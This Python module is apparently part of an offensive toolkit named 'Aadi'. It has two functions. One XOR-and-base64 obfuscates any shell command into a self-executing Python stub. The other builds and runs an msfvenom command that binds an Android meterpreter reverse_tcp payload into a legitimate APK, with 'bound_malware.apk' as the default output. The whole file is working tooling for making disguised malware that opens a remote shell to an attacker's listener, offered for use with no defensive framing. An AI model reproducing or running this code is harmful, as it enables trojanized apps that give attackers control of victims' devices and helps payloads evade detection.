"""
Aadi — Advanced Payload Obfuscator & APK Binner Module
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import os
import subprocess
import base64
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm

console = Console()


def xor_encrypt(data: bytes, key: int = 0x5A) -> bytes:
    """XOR encryption for basic payload obfuscation."""
    return bytes([b ^ key for b in data])


def generate_obfuscated_shellcode(raw_command: str):
    """Generate XOR encoded shellcode wrapper."""
    console.print(Panel(
        f"[bold cyan]Generating Advanced XOR Obfuscated Payload[/]\n"
        f"Original Command: {raw_command}",
        border_style="magenta"
    ))

    raw_bytes = raw_command.encode("utf-8")
    encrypted = xor_encrypt(raw_bytes, 0x5A)
    encoded_b64 = base64.b64encode(encrypted).decode("utf-8")

    stub = f"""import base64

def xor_decrypt(data, key=0x5A):
    return bytes([b ^ key for b in data])

encoded_payload = "{encoded_b64}"
decoded_bytes = base64.b64decode(encoded_payload)
original_cmd = xor_decrypt(decoded_bytes, 0x5A).decode("utf-8")

print("[*] Executing payload...")
import os
os.system(original_cmd)
"""

    out_file = "obfuscated_payload.py"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(stub)

    console.print(f"[bold green]✓ Obfuscated python payload saved to:[/] {out_file}")


def bind_apk_with_payload(legitimate_apk: str, payload_apk: str):
    """Guide or automate APK binding using msfvenom xploit templates."""
    console.print(Panel(
        "[bold yellow]⚠ APK Binding Note[/]\n"
        "Binding a malicious payload into a legitimate APK requires [bold]apktool[/] and [bold]jarsigner[/].\n"
        "Ensure you have them installed on your system.",
        border_style="yellow"
    ))

    if not os.path.exists(legitimate_apk):
        console.print(f"[bold red]✗ Legitimate APK not found:[/] {legitimate_apk}")
        return

    if not os.path.exists(payload_apk):
        console.print(f"[bold red]✗ Payload APK not found:[/] {payload_apk}")
        return

    console.print("[cyan][*] To bind payloads manually via msfvenom, run:[/]")
    console.print(
        f"[bold white]msfvenom -x {legitimate_apk} -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o bound_app.apk[/]")

    if Confirm.ask("[cyan]Would you like AADI to attempt msfvenom binding now?[/]", default=False):
        lhost = Prompt.ask("[cyan]Enter LHOST (Listener IP)[/]")
        lport = Prompt.ask("[cyan]Enter LPORT (Listener Port)[/]", default="4444")
        out_name = Prompt.ask("[cyan]Enter output filename[/]", default="bound_malware.apk")

        cmd = ["msfvenom", "-x", legitimate_apk, "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}",
               f"LPORT={lport}", "-o", out_name]
        console.print(f"[yellow][*] Running command: {' '.join(cmd)}[/]")

        try:
            subprocess.run(cmd)
            console.print(f"[bold green]✓ Bound APK generated successfully:[/] {out_name}")
        except Exception as e:
            console.print(f"[bold red]✗ Msfvenom execution failed:[/] {e}")


def payload_obfuscation_menu():
    """Interactive menu for advanced payload operations."""
    while True:
        console.rule("[bold magenta]🎯 Advanced Payload Obfuscator & Binner[/]")
        console.print("  [cyan]1.[/] XOR + Base64 Custom Python Stub Obfuscation")
        console.print("  [cyan]2.[/] Legitimate APK + Metasploit Payload Binner")
        console.print("  [cyan]0.[/] Back to Main Menu")

        choice = Prompt.ask("[cyan]Select Option ▶[/]", choices=["0", "1", "2"], default="0")
        if choice == "0":
            break
        elif choice == "1":
            cmd = Prompt.ask("[cyan]Enter shell command or payload string to obfuscate[/]")
            if cmd:
                generate_obfuscated_shellcode(cmd)
        elif choice == "2":
            legit = Prompt.ask("[cyan]Enter path to legitimate APK (e.g. calc.apk)[/]")
            payload = Prompt.ask("[cyan]Enter path to payload APK (e.g. payload.apk)[/]")
            bind_apk_with_payload(legit, payload)